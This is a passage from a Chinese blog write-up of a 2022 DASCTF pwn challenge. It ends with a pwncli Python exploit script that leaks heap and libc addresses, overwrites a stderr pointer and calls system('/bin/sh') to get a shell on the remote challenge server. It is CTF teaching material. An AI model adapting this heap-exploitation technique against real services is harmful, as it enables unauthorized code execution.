+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># author: roderick</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwncli</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cli_script</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="p">:</span> <span class="n">tube</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;io&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">store</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;String size? </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sa</span><span class="p">(</span><span class="s2">&#34;String? </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;String idx? </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;String: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">rl</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;String idx? </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;String idx? </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="s2">&#34;New string? </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">store</span><span class="p">(</span><span class="mh">0x400</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">store</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">,</span> <span class="s2">&#34;deadbeef&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mh">0x3f0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">heap_addr</span> <span class="o">=</span> <span class="n">u64_ex</span><span class="p">(</span><span class="n">m</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">log_address</span><span class="p">(</span><span class="s2">&#34;heap_addr&#34;</span><span class="p">,</span> <span class="n">heap_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mh">0x3f0</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">)[:</span><span class="mi">6</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_addr</span> <span class="o">=</span> <span class="n">u64_ex</span><span class="p">(</span><span class="n">m</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">log_address</span><span class="p">(</span><span class="s2">&#34;libc_addr&#34;</span><span class="p">,</span> <span class="n">libc_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">-</span> <span class="mh">0xb7860</span>
+</span></span><span class="line"><span class="cl"><span class="n">log_libc_base_addr</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x50a90</span>
+</span></span><span class="line"><span class="cl"><span class="n">str_bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xb21d7</span>
+</span></span><span class="line"><span class="cl"><span class="n">stderr_use</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xb4080</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log_address</span><span class="p">(</span><span class="s2">&#34;system_addr&#34;</span><span class="p">,</span> <span class="n">system_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log_address</span><span class="p">(</span><span class="s2">&#34;str_bin_sh&#34;</span><span class="p">,</span> <span class="n">str_bin_sh</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mh">0x3f0</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stderr_use</span><span class="p">)[:</span><span class="mi">6</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">flat</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">:</span> <span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x48</span><span class="p">:</span> <span class="n">system_addr</span>
+</span></span><span class="line"><span class="cl"><span class="p">}))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>打远程：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220426222625360.png' alt="image-20220426222625360"></p>
+<h2 class="heading-element" id="引用与参考"><span>引用与参考</span>
+  <a href="#%e5%bc%95%e7%94%a8%e4%b8%8e%e5%8f%82%e8%80%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>1、<a href="https://roderickchan.github.io"target="_blank" rel="external nofollow noopener noreferrer">My Blog<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>2、<a href="https://ctf-wiki.org/"target="_blank" rel="external nofollow noopener noreferrer">Ctf Wiki<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>3、<a href="https://github.com/RoderickChan/pwncli"target="_blank" rel="external nofollow noopener noreferrer">pwncli<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+</div><hr class="awesome-hr" />
+    <h2 id="see-also">相关内容</h2>
+    <ul><li>
+          <a href="/zh-cn/2022-03-08-buuctf-pwn-tasks-20/" title="Buuctf-Pwn-Tasks-20">Buuctf-Pwn-Tasks-20</a></li><li>
+          <a href="/zh-cn/2022-02-12-vnctf2022-pwn-wp/" title="V&amp;NCTF2022-Pwn-Wp">V&amp;NCTF2022-Pwn-Wp</a></li><li>
+          <a href="/zh-cn/2021-09-12-ciscn-2019-pwn%E7%B3%BB%E5%88%97/" title="Ciscn-2019-Pwn系列">Ciscn-2019-Pwn系列</a></li><li>
+          <a href="/zh-cn/2022-03-28-2022dasctfxsu%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-pwn-wp/" title="2022DASCTFXSU三月春季挑战赛-Pwn-Wp">2022DASCTFXSU三月春季挑战赛-Pwn-Wp</a></li><li>
+          <a href="/zh-cn/2022-04-15-buuctf-pwn-tasks-20/" title="BUUCTF-Pwn合集">BUUCTF-Pwn合集</a></li></ul><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2022-04-23 18:21:41">更新于 2022-04-23&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="https://roderickchan.github.io/zh-cn/2022-04-23-2022dasctf-apr-x-fate-pwn-wp/" data-title="2022DASCTF-Apr-X-FATE-Pwn-Wp" data-hashtags="pwn"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://roderickchan.github.io/zh-cn/2022-04-23-2022dasctf-apr-x-fate-pwn-wp/" data-hashtag="pwn"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://roderickchan.github.io/zh-cn/2022-04-23-2022dasctf-apr-x-fate-pwn-wp/" data-title="2022DASCTF-Apr-X-FATE-Pwn-Wp"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://roderickchan.github.io/zh-cn/2022-04-23-2022dasctf-apr-x-fate-pwn-wp/" data-title="2022DASCTF-Apr-X-FATE-Pwn-Wp"><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>LINE</title><path d="M19.365 9.863c.349.0.63.285.63.631.0.345-.281.63-.63.63H17.61v1.125h1.755c.349.0.63.283.63.63.0.344-.281.629-.63.629h-2.386c-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346.0.627.285.627.63.0.349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211.0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346.0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195.0.375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345.0.63.285.63.63v4.771zm-5.741.0c0 .344-.282.629-.631.629-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346.0.628.285.628.63v4.771zm-2.466.629H4.917c-.345.0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348.0.63.285.63.63v4.141h1.756c.348.0.629.283.629.63.0.344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943.0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://roderickchan.github.io/zh-cn/2022-04-23-2022dasctf-apr-x-fate-pwn-wp/" data-title="2022DASCTF-Apr-X-FATE-Pwn-Wp"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/zh-cn/tags/pwn/" class="post-tag" title="标签 - pwn">pwn</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/zh-cn/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/zh-cn/2022-04-15-buuctf-pwn-tasks-20/" class="post-nav-item" rel="prev" title="BUUCTF-Pwn合集"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>BUUCTF-Pwn合集</a><a href="/zh-cn/2022-04-28-seccon-2020-kstack/" class="post-nav-item" rel="next" title="Seccon-2020-Kstack">Seccon-2020-Kstack<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div class="post-reward">
+    <div class="comment">Buy me a coffee~</div>
+    <input type="checkbox" class="reward-input" name="reward" id="fi-reward" hidden />
+    <label class="reward-button" for="fi-reward"><i class="fa-solid fa-qrcode fa-fw" aria-hidden="true"></i>赞赏</label>
+    <div class="reward-ways" data-mode="fixed"><div><img src='/images/alipay.jpg' alt="roderick 支付宝"><span data-animation>支付宝</span>
+          </div><div><img src='/images/wechatpay.jpg' alt="roderick 微信"><span data-animation>微信</span>
+          </div></div>
+  </div><div id="comments"><div id="waline" class="comment"></div><noscript>
+        Please enable JavaScript to view the comments powered by <a href="https://waline.js.org/" rel="external nofollow noopener noreferrer">Waline</a>.
+      </noscript></div></article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><div class="follow-container">
+    <a href="https://roderickchan.github.io" class="author-link" target="_blank">
+      <img src="https://gravatar.loli.net/avatar/6f579d9b68b13aed76b08fee1c3ede40?s=32&amp;d=mp" alt="roderick" class="author-avatar"> roderick
+    </a>
+    <a href="https://github.com/RoderickChan" class="follow-btn" target="_blank" title="关注我的 GitHub！">
+      <i class="fa-brands fa-github fa-fw fa-beat" aria-hidden="true"></i> 关注
+    </a>
+  </div>
+  <hr class="hr-edge-weak"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="clustrmaps-custom">
+    <center>
+<script type='text/javascript' id='clustrmaps' src='//cdn.clustrmaps.com/map_v2.js?cl=ffffff&w=600&t=tt&d=bKrzPRSdAZuPQnsWUdvwNdyX5hI0m3cpvARXwWbJct4'></script>
+    </center>
+</div><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.147.7"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.21-87ca54d0"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="https://www.roderickchan.cn"target="_blank" rel="external nofollow noopener noreferrer">roderick</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span></div><div class="footer-line statistics"><span class="site-time" title='网站运行中……'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="run-times ms-1">网站运行中……</span></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div><div class="footer-line beian"><span class="icp footer-divider"><a href="http://beian.miit.gov.cn/">鄂ICP备2022016286号</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><a href="https://github.com/RoderickChan" title="View source on GitHub"target="_blank" rel="external nofollow" class="github-corner right d-none-mobile"><svg viewBox="0 0 250 250" aria-hidden="true" width="56" height="56"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/waline/waline.css"><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/waline/waline.umd.js" defer></script><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="https://vercount.one/js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","maxShownLines":-1},"comment":{"enable":true,"expired":false,"waline":{"copyright":true,"dark":"html[data-theme='dark']","el":"#waline","emoji":["//unpkg.com/@waline/emojis@1.1.0/weibo"],"highlighter":true,"imageUploader":true,"lang":"zh-cn","login":"enable","meta":["nick","mail","link"],"pageSize":10,"reaction":true,"search":false,"serverURL":"https://waline.roderickchan.cn/","texRenderer":false}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"algoliaAppID":"6CJ87MRD62","algoliaIndex":"index.zh-cn","algoliaSearchKey":"9f68a62dba71402a82f37137a7a886d2","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30,"type":"algolia"},"siteTime":"2022-10-01T09:00:00+08:00","twemoji":true,"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.21-87ca54d0","watermark":{"colspacing":30,"content":"roderick' blog","enable":true,"fontfamily":"inherit","fontsize":0.85,"height":21,"opacity":0.0125,"rotate":15,"rowspacing":60,"width":150}};</script><script src="/js/theme.min.js" defer></script><script src="/lib/translate.min.js" defer></script><script>window.ATConfig={"hugoLangCodes":["zh-CN"],"hugoLangMap":{"zh-CN":"/zh-cn/2022-04-23-2022dasctf-apr-x-fate-pwn-wp/"}};</script><script src="/js/translate.fixit.min.js" defer></script></body>
+</html>
